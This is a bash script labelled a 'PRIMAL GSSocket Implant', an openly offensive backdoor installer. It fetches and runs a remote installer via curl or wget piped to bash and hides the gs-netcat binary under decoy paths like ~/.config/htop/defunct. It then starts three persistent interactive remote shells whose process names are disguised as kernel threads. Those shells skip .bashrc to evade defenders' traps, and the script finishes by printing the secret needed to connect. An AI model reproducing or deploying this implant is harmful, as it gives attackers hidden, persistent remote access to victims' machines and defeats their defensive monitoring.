#!/bin/bash
# PRIMAL GSSocket Implant - Using official gsocket.io/y method
# Superior stealth, bypass .bashrc traps

SECRET="${1:-}"
MODE="${2:-stealth}"

# Disguised process names
NAMES=("[kworker/0:0-events]" "[kworker/1:1-mm]" "[migration/0]" "[ksoftirqd/0]" "[watchdogd]" "[rcu_sched]" "[kswapd0]" "[card0-crtc8]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")

echo '{"status":"initializing"}'

# Check if gs-netcat already exists
if command -v gs-netcat >/dev/null 2>&1; then
    GS_BIN=$(command -v gs-netcat)
    echo '{"status":"gs-netcat found","path":"'$GS_BIN'"}'
elif [ -f "/usr/bin/gs-netcat" ]; then
    GS_BIN="/usr/bin/gs-netcat"
elif [ -f "$HOME/.config/htop/defunct" ]; then
    GS_BIN="$HOME/.config/htop/defunct"
elif [ -f "/var/www/monitor-server/defunct" ]; then
    GS_BIN="/var/www/monitor-server/defunct"
else
    # Install via official method
    echo '{"status":"installing gs-netcat"}'
    
    # Try curl first
    if command -v curl >/dev/null 2>&1; then
        # Install with custom secret if provided
        if [ -n "$SECRET" ]; then
            X="$SECRET" bash -c "$(curl -fsSL gsocket.io/y)" 2>/dev/null
        else
            bash -c "$(curl -fsSL gsocket.io/y)" 2>/dev/null
        fi
    # Try wget
    elif command -v wget >/dev/null 2>&1; then
        if [ -n "$SECRET" ]; then
            X="$SECRET" bash -c "$(wget -qO- gsocket.io/y)" 2>/dev/null
        else
            bash -c "$(wget -qO- gsocket.io/y)" 2>/dev/null
        fi
    else
        echo '{"status":"error","message":"need curl or wget"}'
        exit 1
    fi
    
    # Find where it was installed
    if command -v gs-netcat >/dev/null 2>&1; then
        GS_BIN=$(command -v gs-netcat)
    elif [ -f "$HOME/.config/htop/defunct" ]; then
        GS_BIN="$HOME/.config/htop/defunct"
    else
        # Search common locations
        for loc in /usr/bin /tmp/.gsusr-* /dev/shm "$PWD"; do
            if [ -f "$loc/defunct" ]; then
                GS_BIN="$loc/defunct"
                break
            fi
            if [ -f "$loc/gs-netcat" ]; then
                GS_BIN="$loc/gs-netcat"
                break
            fi
        done
    fi
fi

if [ -z "$GS_BIN" ] || [ ! -f "$GS_BIN" ]; then
    echo '{"status":"error","message":"gs-netcat not found after install"}'
    exit 1
fi

# Read existing secret if available
if [ -z "$SECRET" ]; then
    for secfile in "$HOME/.config/htop/defunct.dat" "/var/www/monitor-server/defunct.dat" "$(dirname $GS_BIN)/defunct.dat"; do
        if [ -f "$secfile" ]; then
            SECRET=$(cat "$secfile" 2>/dev/null)
            break
        fi
    done
fi

# Generate secret if still empty
if [ -z "$SECRET" ]; then
    SECRET=$($GS_BIN -g 2>/dev/null || head -c 16 /dev/urandom | xxd -p)
fi

echo '{"status":"planting","secret":"'$SECRET'","binary":"'$GS_BIN'"}'

# Start stealth instances with bypass
start_stealth() {
    local name="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
    
    # CRITICAL: Use /bin/sh --norc --noprofile to BYPASS .bashrc traps
    # This avoids the password prompt in bashrc.txt style traps
    (
        cd /tmp 2>/dev/null || cd /
        export TERM=xterm-256color
        export GS_ARGS="-s $SECRET -liqD"
        
        # exec -a disguises the process name
        exec -a "$name" "$GS_BIN" -s "$SECRET" -l -e "/bin/sh --norc --noprofile -i" </dev/null >/dev/null 2>&1
    ) &
    disown 2>/dev/null
}

# Kill any existing instances first (optional, for fresh start)
if [ "$MODE" = "fresh" ]; then
    pkill -f "gs-netcat.*$SECRET" 2>/dev/null
    pkill -f "defunct.*$SECRET" 2>/dev/null
    sleep 1
fi

# Check how many already running
existing=$(pgrep -f "defunct" 2>/dev/null | wc -l)

if [ "$existing" -lt 3 ]; then
    # Start multiple stealth instances
    for i in 1 2 3; do
        start_stealth
        sleep 0.5
    done
fi

# Verify
sleep 2
running=$(pgrep -f "defunct\|gs-netcat" 2>/dev/null | wc -l)

# Get PIDs for display
pids=$(pgrep -f "defunct\|gs-netcat" 2>/dev/null | tr '\n' ',' | sed 's/,$//')

cat << RESULT
{
    "status": "success",
    "secret": "$SECRET",
    "binary": "$GS_BIN",
    "instances": $running,
    "pids": "$pids",
    "connect": "gs-netcat -s $SECRET -i",
    "alt_connect": "S=\"$SECRET\" bash -c \"\$(curl -fsSL gsocket.io/y)\"",
    "features": [
        "official-gsocket",
        "bashrc-bypass",
        "process-disguise",
        "multi-instance"
    ]
}
RESULT
